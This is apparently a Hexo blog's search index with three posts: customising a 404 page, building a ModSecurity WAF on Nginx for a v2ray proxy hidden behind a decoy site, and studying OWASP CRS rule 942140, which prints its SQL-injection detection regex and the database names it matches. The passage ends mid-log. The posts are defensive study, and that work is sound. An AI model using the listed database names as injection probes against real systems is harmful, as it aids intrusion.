<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>How to customize your 404 page in hexo blog?</title>
    <url>//posts/en/how-to-customize-404-page-in-hexo-blog.html</url>
    <content><![CDATA[<h2 id="FOREWORD"><a href="#FOREWORD" class="headerlink" title="FOREWORD"></a>FOREWORD</h2><p>Today I checked the keyword 长ping in google, my page ranks number one, so amazing! But I click the page, it’s a 404 page. It suddenly occured to me that I had changed all of my URLs! So Google has not indexed my new URLs yet. It’s so weird that the top one search result is a blank page without any tip guides the users back to home page. This article recorded how to customize the 404 page and guide the users back to home page.<br><escape> <span id="more"></span></escape><br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image.png" alt="image.png"></p>
<h2 id="STEPS"><a href="#STEPS" class="headerlink" title="STEPS"></a>STEPS</h2><p>The following steps are applicable to any themes of your hexo blog. No matter the theme is NEXT or others, you can follow these steps.</p>
<ol>
<li><p>Create a <code>404.html</code> file on the theme folder. The html file is to customize your 404 page.<br>For example, my theme is NEXT, I need to create a <code>404.html</code> file on this directory: <code>\themes\next\source</code>.<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image8f94f3a6ef348c9f.png" alt="image8f94f3a6ef348c9f.png"></p>
</li>
<li><p>Then you can edit the html, and write your code to customize the page. I choose <a href="https://www.qq.com/404/">Tencent 404 page</a> as my 404 page. The code below is for your reference.</p>
<blockquote>
<p>Note!! Please replace <code>https://dana5haw.com</code> with your homePageUrl. And replace <code>返回主页（您可以进入首页继续搜索）</code> with your own words to guide the users back to home page.</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>The javascript may be updated by Tencent, please refer to Tencent’s official code.<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image845ad54beb3a14e4.png" alt="image845ad54beb3a14e4.png"></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;https://dana5haw.com&quot;</span> <span class="attr">homePageName</span>=<span class="string">&quot;返回主页（您可以进入首页继续搜索）&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>Deploy and update your website by inputing this command: <code>hexo g -d</code>.</li>
<li>Test your 404 page. You can input a non-existed URL in browser to test if your 404 page is successfully updated. For example, my domain is <code>dana5haw.com</code>, so I may input this non-existed URL <code>https://dana5haw.com/111</code> to test my 404 page.<br>Look what the final 404 page!<br><img src="https://v2ray.dana5haw.com:8008/images/2021/08/05/image61eb468b2a976a0f.png" alt="image61eb468b2a976a0f.png"></li>
</ol>
<h2 id="CONCLUSION"><a href="#CONCLUSION" class="headerlink" title="CONCLUSION"></a>CONCLUSION</h2><p>You can make the 404 page look more fantastic, since you have known the steps to customize it.</p>
<h2 id="REFERRENCE"><a href="#REFERRENCE" class="headerlink" title="REFERRENCE"></a>REFERRENCE</h2><p><a href="https://www.zhihu.com/question/21650209">https://www.zhihu.com/question/21650209</a></p>
<h2 id="RELATED-POST"><a href="#RELATED-POST" class="headerlink" title="RELATED POST"></a>RELATED POST</h2><p><a href="https://dana5haw.com/posts/ZH-CN/how-to-customize-404-page-in-hexo-blog.html">https://dana5haw.com/posts/ZH-CN/how-to-customize-404-page-in-hexo-blog.html</a></p>
]]></content>
      <categories>
        <category>hexo blog</category>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>404 page</tag>
        <tag>hexo blog</tag>
        <tag>next theme</tag>
        <tag>404页面</tag>
        <tag>hexo博客</tag>
        <tag>next主题</tag>
      </tags>
  </entry>
  <entry>
    <title>vps加固之通过Nginx动态加载modesucurity自制WAF</title>
    <url>//posts/ZH-CN/Nginx_Dynamic_Modsecurity_WAF.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>v2ray搭的梯子，我用了一个web模板页面掩人耳目，但是开放的web给vps增加了安全风险。得想个办法，把这个开放的web防护起来。那就自制一个WAF咯，我的梯子本身是v2ray+ws+tls+web这个模式，已经安装了Nginx软件（用于反向代理，及搭建web服务）。自制WAF基于Nginx，再安装Modsecurity软件，配置一下就完事。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="Nginx动态加载Modsecurity自制WAF"><a href="#Nginx动态加载Modsecurity自制WAF" class="headerlink" title="Nginx动态加载Modsecurity自制WAF"></a>Nginx动态加载Modsecurity自制WAF</h2><h3 id="安装Modsecurity"><a href="#安装Modsecurity" class="headerlink" title="安装Modsecurity"></a>安装Modsecurity</h3><h4 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># apt install -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev</span></span><br></pre></td></tr></table></figure>
<h4 id="下载ModSecurity-3-0源码"><a href="#下载ModSecurity-3-0源码" class="headerlink" title="下载ModSecurity 3.0源码"></a>下载ModSecurity 3.0源码</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># git clone --depth 1 -b v3/master --single-branch https://github.com/SpiderLabs/ModSecurity</span></span><br></pre></td></tr></table></figure>
<p>以下步骤是在编译<code>libmodsecurity</code>。大约会花15分钟时间，取决于系统的处理能力。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~/ModSecurity<span class="comment"># git submodule init</span></span><br><span class="line">root@vultr:~/ModSecurity<span class="comment"># git submodule update</span></span><br><span class="line">root@vultr:~/ModSecurity<span class="comment"># ./build.sh</span></span><br><span class="line"><span class="comment">#注意：这一步出现`fatal: No names found, cannot describe anything.`报错，不用管它。</span></span><br><span class="line">root@vultr:~/ModSecurity<span class="comment"># ./configure</span></span><br><span class="line">root@vultr:~/ModSecurity<span class="comment"># make</span></span><br><span class="line">root@vultr:~/ModSecurity<span class="comment"># make install</span></span><br></pre></td></tr></table></figure>
<h4 id="下载Modsecurity-Nginx连接器"><a href="#下载Modsecurity-Nginx连接器" class="headerlink" title="下载Modsecurity-Nginx连接器"></a>下载Modsecurity-Nginx连接器</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># git clone --depth 1 https://github.com/SpiderLabs/ModSecurity-nginx.git</span></span><br></pre></td></tr></table></figure>
<h4 id="Nginx动态加载Modsecurity模块"><a href="#Nginx动态加载Modsecurity模块" class="headerlink" title="Nginx动态加载Modsecurity模块"></a>Nginx动态加载Modsecurity模块</h4><p>因为我本机是用apt直接安装的Nginx，需要用源码编译安装对应版本的Nginx，动态加载Modsecurity模块。<br>我的Nginx版本是Nginx/1.14.0：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># nginx -v</span></span><br><span class="line">nginx version: nginx/1.14.0 (Ubuntu)</span><br></pre></td></tr></table></figure>
<h4 id="下载Nginx-1-14-0源码，编译生成ngx-http-modsecurity-module-so"><a href="#下载Nginx-1-14-0源码，编译生成ngx-http-modsecurity-module-so" class="headerlink" title="下载Nginx/1.14.0源码，编译生成ngx_http_modsecurity_module.so"></a>下载Nginx/1.14.0源码，编译生成ngx_http_modsecurity_module.so</h4><div class="note info">
            <p>注意：以下的编译过程，将导致nginx配置文件检查失败，报错<code>nginx: [emerg] module &quot;/usr/share/nginx/modules/ngx_http_modsecurity_module.so&quot; is not binary compatible in /etc/nginx/nginx.conf:4</code></p>
          </div>

<details><summary>以下操作将导致报错</summary>
<p>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># wget http://nginx.org/download/nginx-1.14.0.tar.gz</span></span><br><span class="line">root@vultr:~<span class="comment"># tar zxvf nginx-1.14.0.tar.gz</span></span><br><span class="line">root@vultr:~<span class="comment"># cd nginx-1.14.0/</span></span><br><span class="line">root@vultr:~/nginx-1.14.0<span class="comment"># ./configure --with-compat --add-dynamic-module=../ModSecurity-nginx</span></span><br><span class="line">root@vultr:~/nginx-1.14.0<span class="comment"># make modules</span></span><br><span class="line">root@vultr:~/nginx-1.14.0/objs<span class="comment"># cp ngx_http_modsecurity_module.so /usr/share/nginx/modules/</span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>因为我的vps已经用apt方式安装了Nginx，所以在动态编译第三方模块时，要确保和我已安装的Nginx有相同的编译参数。这个方法参考了<a href="https://github.com/SpiderLabs/ModSecurity-nginx/issues/117#issuecomment-495350465">github的回答</a><br>第一步：<code>nginx -t</code>查看已安装的Nginx有哪些编译参数<br>第二步：下载源码，重新编译一版Nginx，在已安装Nginx的编译参数基础上，加上动态编译参数<code>--add-dynamic-module=../ModSecurity-nginx</code><br>第三步：生成模块<code>ngx_http_modsecurity_module.so</code><br>第四步：将生成的模块<code>ngx_http_modsecurity_module.so</code>复制到已安装Nginx的modules目录<code>/usr/share/nginx/modules/</code></p>
<div class="note info">
            <p>注意：由于我的ubuntu系统没有安装<code>OpenSSL</code>和<code>HTTP XSLT</code>这两个软件的依赖包，导致编译错误。所以，先安装这两款软件的依赖包。<br><a href="https://blog.csdn.net/Linuxhus/article/details/103068984">OpenSSL:依赖包安装</a><br><a href="https://stackoverflow.com/questions/57415360/configure-error-the-http-xslt-module-requires-the-libxml2-libxslt-libraries">HTTP XSLT:依赖包安装</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install openssl libssl-dev</span><br><span class="line">apt-get install libxslt-dev</span><br><span class="line">apt-get install libgd-dev</span><br><span class="line">apt-get install libgeoip-dev</span><br></pre></td></tr></table></figure>
          </div>
<details><summary>点击展开正确的操作步骤</summary>
<p>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># wget http://nginx.org/download/nginx-1.14.0.tar.gz</span></span><br><span class="line">root@vultr:~<span class="comment"># tar zxvf nginx-1.14.0.tar.gz</span></span><br><span class="line">root@vultr:~<span class="comment"># cd nginx-1.14.0/</span></span><br><span class="line">root@vultr:~/nginx-1.14.0<span class="comment"># ./configure --with-cc-opt=&#x27;-g -O2 -fdebug-prefix-map=/build/nginx-GkiujU/nginx-1.14.0=. -fstack-protector-strong -Wformat -Werror=format-security -fPIC -Wdate-time -D_FORTIFY_SOURCE=2&#x27; --with-ld-opt=&#x27;-Wl,-Bsymbolic-functions -Wl,-z,relro -Wl,-z,now -fPIC&#x27; --prefix=/usr/share/nginx --conf-path=/etc/nginx/nginx.conf --http-log-path=/var/log/nginx/access.log --error-log-path=/var/log/nginx/error.log --lock-path=/var/lock/nginx.lock --pid-path=/run/nginx.pid --modules-path=/usr/lib/nginx/modules --http-client-body-temp-path=/var/lib/nginx/body --http-fastcgi-temp-path=/var/lib/nginx/fastcgi --http-proxy-temp-path=/var/lib/nginx/proxy --http-scgi-temp-path=/var/lib/nginx/scgi --http-uwsgi-temp-path=/var/lib/nginx/uwsgi --with-debug --with-pcre-jit --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_auth_request_module --with-http_v2_module --with-http_dav_module --with-http_slice_module --with-threads --with-http_addition_module --with-http_geoip_module=dynamic --with-http_gunzip_module --with-http_gzip_static_module --with-http_image_filter_module=dynamic --with-http_sub_module --with-http_xslt_module=dynamic --with-stream=dynamic --with-stream_ssl_module --with-mail=dynamic --with-mail_ssl_module --add-dynamic-module=../ModSecurity-nginx</span></span><br><span class="line">root@vultr:~/nginx-1.14.0<span class="comment"># make modules</span></span><br><span class="line">root@vultr:~/nginx-1.14.0/objs<span class="comment"># cp ngx_http_modsecurity_module.so /usr/share/nginx/modules/</span></span><br></pre></td></tr></table></figure>

</p>
</details>

<h4 id="Nginx配置文件加载动态模块"><a href="#Nginx配置文件加载动态模块" class="headerlink" title="Nginx配置文件加载动态模块"></a>Nginx配置文件加载动态模块</h4><p>修改Nginx配置文件<code>/etc/nginx/nginx.conf</code>，添加代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load_module modules/ngx_http_modsecurity_module.so;</span><br></pre></td></tr></table></figure>
<p>如图：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1k5ndxrlj30nk0grmy2.jpg" alt="image.png"></p>
<h4 id="开启Modsecurity的拦截模式"><a href="#开启Modsecurity的拦截模式" class="headerlink" title="开启Modsecurity的拦截模式"></a>开启Modsecurity的拦截模式</h4><p>下载推荐配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:/etc/nginx<span class="comment"># wget -P /etc/nginx/modsec/ https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended</span></span><br><span class="line">root@vultr:/etc/nginx<span class="comment"># cd modsec/</span></span><br><span class="line">root@vultr:/etc/nginx/modsec<span class="comment"># mv modsecurity.conf-recommended modsecurity.conf</span></span><br></pre></td></tr></table></figure>
<p>修改配置文件<code>modsecurity.conf</code>，将<code>SecRuleEngine DetectionOnly</code>改为<code>SecRuleEngine On</code>，意思是将Modesecurity的监控模式改为拦截模式。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1eobzz7rj30ps0kp76b.jpg" alt="image.png"></p>
<h4 id="创建一条测试用的规则"><a href="#创建一条测试用的规则" class="headerlink" title="创建一条测试用的规则"></a>创建一条测试用的规则</h4><p>增加配置文件：<code>/etc/nginx/modsec/main.conf</code>：</p>
<details><summary>点击展开main.conf</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># From https://github.com/SpiderLabs/ModSecurity/blob/master/</span><br><span class="line"># modsecurity.conf-recommended</span><br><span class="line">#</span><br><span class="line"># Edit to set SecRuleEngine On</span><br><span class="line">Include &quot;/etc/nginx/modsec/modsecurity.conf&quot;</span><br><span class="line"></span><br><span class="line"># Basic test rule</span><br><span class="line">SecRule ARGS:testparam &quot;@contains test&quot; &quot;id:1234,deny,status:403&quot;</span><br></pre></td></tr></table></figure>

</p>
</details>

<h4 id="对Nginx的server开启Modsecurity防护"><a href="#对Nginx的server开启Modsecurity防护" class="headerlink" title="对Nginx的server开启Modsecurity防护"></a>对Nginx的server开启Modsecurity防护</h4><p>修改Nginx配置文件：<code>/etc/nginx/sites-enabled/default</code>，添加以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modsecurity on;</span><br><span class="line">modsecurity_rules_file /etc/nginx/modsec/main.conf;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1eyna09rj30q50kn0v7.jpg" alt="image.png"></p>
<h4 id="nginx配置文件检查报错"><a href="#nginx配置文件检查报错" class="headerlink" title="nginx配置文件检查报错"></a>nginx配置文件检查报错</h4><p>可是现在<code>nginx -t</code>遇到了报错。</p>
<details><summary>报错信息</summary>
<p>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># nginx -t</span></span><br><span class="line">nginx: [emerg] <span class="string">&quot;modsecurity_rules_file&quot;</span> directive Rules error. File: /etc/nginx/modsec/modsecurity.conf. Line: 236. Column: 17. Failed to locate the unicode map file from: unicode.mapping Looking at: <span class="string">&#x27;unicode.mapping&#x27;</span>, <span class="string">&#x27;unicode.mapping&#x27;</span>, <span class="string">&#x27;/etc/nginx/modsec/unicode.mapping&#x27;</span>, <span class="string">&#x27;/etc/nginx/modsec/unicode.mapping&#x27;</span>.  <span class="keyword">in</span> /etc/nginx/sites-enabled/default:25</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf <span class="built_in">test</span> failed</span><br></pre></td></tr></table></figure>

</p>
</details>

<p><a href="https://github.com/SpiderLabs/ModSecurity/issues/1941#issuecomment-433937742">解决方法</a>：<br>将<code>/etc/nginx/conf.d/modsecurity.conf</code>和<code>unicode.mapping</code>放到同一个目录。（报错信息就是说<code>unicode.mapping</code>这个文件的位置放错了，所以我移把它移动到了正确位置）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># find / -name unicode.mapping</span></span><br><span class="line">/root/ModSecurity/unicode.mapping</span><br><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># mv /root/ModSecurity/unicode.mapping /etc/nginx/modsec/</span></span><br><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># ls /etc/nginx/modsec/unicode.mapping</span></span><br><span class="line">/etc/nginx/modsec/unicode.mapping</span><br></pre></td></tr></table></figure>
<p>好的，现在<code>nginx -t</code>终于显示成功了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># nginx -t</span></span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf <span class="built_in">test</span> is successful</span><br></pre></td></tr></table></figure>
<h4 id="重启Nginx服务，测试防护效果"><a href="#重启Nginx服务，测试防护效果" class="headerlink" title="重启Nginx服务，测试防护效果"></a>重启Nginx服务，测试防护效果</h4><p>重启Nginx：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># nginx -s reload</span></span><br><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># service nginx restart</span></span><br></pre></td></tr></table></figure>
<p>测试防护效果：curl我们的web服务，加上参数<code>testparam=test</code>，如果返回<code>403 Forbidden</code>，就说明防护规则已生效。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:/usr/share/nginx/modules<span class="comment"># curl https://我的servername:我的serverport/?testparam=test</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">&quot;white&quot;</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在Nginx动态加载第三方模块时，出现错误<code>ngx_http_modsecurity_module.so is not binary compatible</code>，解决这个问题花了很多时间。因为第一次接触到Nginx动态加载模块，不懂原理。Nginx加载模块，分为了静态加载和动态加载。这<a href="https://www.v2ex.com/t/275754">两者的区别</a>在网上可以查到。像我这种情况，Nginx本身在运行服务，要在线增加第三方模块，使用动态编译，就不会破坏已经配置的Nginx，只是增加一个功能模块，重载Nginx服务，就相当于新增一个功能，原有功能不受影响。<br>现在只是把WAF安装到了vps，简单测试了WAF的效果。具体的策略规则这些，还需要进一步研究并配置。主要是用modsecurity的配置文件<code>main.conf</code>来控制防护策略。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/">官方文档：主要是参考这个文档做的，不能完全照搬，按官方操作，编译ngx_http_modsecurity_module.so的时候会报错</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
        <category>Modsecurity</category>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>Modsecurity</tag>
        <tag>Nginx动态加载第三方模块</tag>
        <tag>vps自制WAF</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942140</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942140.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942140</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942140的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># -=[ Detect DB Names ]=-</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># Regexp generated from util/regexp-assemble/regexp-942140.data using Regexp::Assemble.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To rebuild the regexp:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   <span class="built_in">cd</span> util/regexp-assemble</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   ./regexp-assemble.pl regexp-942140.data</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that after assemble an outer bracket with an ignore <span class="keyword">case</span> flag and a word boundary is added</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the Regexp::Assemble output:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   Add ignore <span class="keyword">case</span> flag and word boundary: <span class="string">&quot;(?i:\bASSEMBLE_OUTPUT)&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* <span class="string">&quot;@rx (?i:\b(?:(?:m(?:s(?:ys(?:ac(?:cess(?:objects|storage|xml)|es)|(?:relationship|object|querie)s|modules2?)|db)|aster\.\.sysdatabases|ysql\.db)|pg_(?:catalog|toast)|information_schema|northwind|tempdb)\b|s(?:(?:ys(?:\.database_name|aux)|qlite(?:_temp)?_master)\b|chema(?:_name\b|\W*\())|d(?:atabas|b_nam)e\W*\())&quot;</span> \</span></span><br><span class="line"><span class="bash">    <span class="string">&quot;id:942140,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    phase:2,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    block,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    capture,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    t:none,t:urlDecodeUni,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    msg:&#x27;SQL Injection Attack: Common DB Names Detected&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;application-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;language-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;platform-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;attack-sqli&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;paranoia-level/1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;PCI/6.5.2&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ctl:auditLogParts=+E,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    severity:&#x27;CRITICAL&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>这条规则的正则表达式是从<code>util/regexp-assemble/regexp-942140.data</code>生成的。</p>
<details><summary>点击展开regexp-942140.data</summary>
<p>

<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">database\W*\(</span><br><span class="line">db_name\W*\(</span><br><span class="line">information_schema\b</span><br><span class="line">master\.\.sysdatabases\b</span><br><span class="line">msdb\b</span><br><span class="line">msysaccessobjects\b</span><br><span class="line">msysaccessstorage\b</span><br><span class="line">msysaccessxml\b</span><br><span class="line">msysaces\b</span><br><span class="line">msysmodules2\b</span><br><span class="line">msysmodules\b</span><br><span class="line">msysobjects\b</span><br><span class="line">msysqueries\b</span><br><span class="line">msysrelationships\b</span><br><span class="line">mysql\.db\b</span><br><span class="line">northwind\b</span><br><span class="line">pg_catalog\b</span><br><span class="line">pg_toast\b</span><br><span class="line">schema_name\b</span><br><span class="line">schema\W*\(</span><br><span class="line">sqlite_master\b</span><br><span class="line">sqlite_temp_master\b</span><br><span class="line">sysaux\b</span><br><span class="line">sys\.database_name\b</span><br><span class="line">tempdb\b</span><br></pre></td></tr></table></figure>

</p>
</details>

<p><code>msg:&#39;SQL Injection Attack: Common DB Names Detected&#39;</code>这条规则是检测常见的数据库名称。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: MSDb found within ARGS:padimg: &lt;?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?&gt;&lt;BJCAROOT&gt;&lt;Version&gt;1&lt;/Version&gt;&lt;SignTID&gt;1122&lt;/SignTID&gt;&lt;EncKey&gt;MSDb/9OSDPk3JEzTsaR/pfxktGJy68vS8Dz6s1MX6y0y BlB25Fa72 31I3syty0mOiHH49dI8huN9BbHFjZF7E5VdCeZ6vgrtiEUl9LU7X6SLM0UOyGEZJPjqhZR7tFXDmJx6y5f00yznvIPdJ8R3V52YnR5OWnYPMO0f2SRZM=&lt;/EncKey&gt;&lt;Cert&gt;&lt;EncCertSN&gt;102105000006752389&lt;/EncCertSN&gt;&lt;EncCertKeyID&gt;N/A&lt;/EncCertKeyID&gt;&lt;EncAlg&gt;1&lt;/EncAlg&gt;&lt;/Cert&gt;&lt;EncData&gt;7R8inJH6DySoIX0wDfdJBc5LC1v0HilpVFyZwBWiCdht sicAKUQEtbpMkIuJ8d9zmcEbo/cXA263Esm JU6H3 d5xqFLCyGS7FnN4lkS6M5qmOdXRUYHfb6RXt4O/TKwmUTsS6jEl2cQMWjhFm1k0yY PluQxRC1nmhUaH7FZGkLse1BiOBza8skWbpKn6bnTjaVeub5WjnpEiyZT/EqpQLXRVPH5bc8 P Q69IJorA3HvykeGb2MB/jJ9CD rchZobj0qoL0oRtXnCKCvosQjwb2lRe90QFn9gNPbgQJ1Y9729i47/adP7SgXWZmjCmpFgxE1izOcBINcI1Pka4laKWx5hPNOYntYOCtlc6o65b9nbB ZkRdtWWHvNc45V00EoVrRIDsXvO7FziDNTgob2n9RWz XnquWxu8c9hUyCYGn6AoYnPdsdJHy7Ju4wVnEBLsZIlo8gUh63wyKZBWrZJ/RiGXoofObU5eLowmgdrXpgQTeergnzQR23tqmpx9vC6p92iQWqxQLtH8dbDDzIqUyx45wwfKhGhw/0HrTL/pBI3DnPPSHA9ftBwLTvbxqX/x MlAX2ZXCjF1WESBIkThpMXSvNqcVhledyLx5YMJnwANwKvfYLB4ojrrcS2hBEbry1c3QAfU/dU18PSFWXbAr1YJUJptwfLVzWKPspW5NqJ QE37EBVN9/sJslDlUQ3VF0nR /O3TYRfSXxotcS6tqfbDCtwYv5CNjyernUVyL6paZy xs5zZy22TQ/ftMRJSMGbAM9e7vHjnWVo/ 7tfouD 9PBtvXyauhSAubaarljUV9jbpL1ve8uafh2QC7U647xSVpVTvGvG4uFTeJ8UccepW2gZB78fYJ/HRPu8wwgySAt5AYkynfaFb36PPHeoPX/HInW5iD0F SeOGXKjIOxu6bZWnbD/Tlk3OyrMacXDp3vXIBZNqqMQV5fw3crGjZsOUH8V6H43 vBHbc 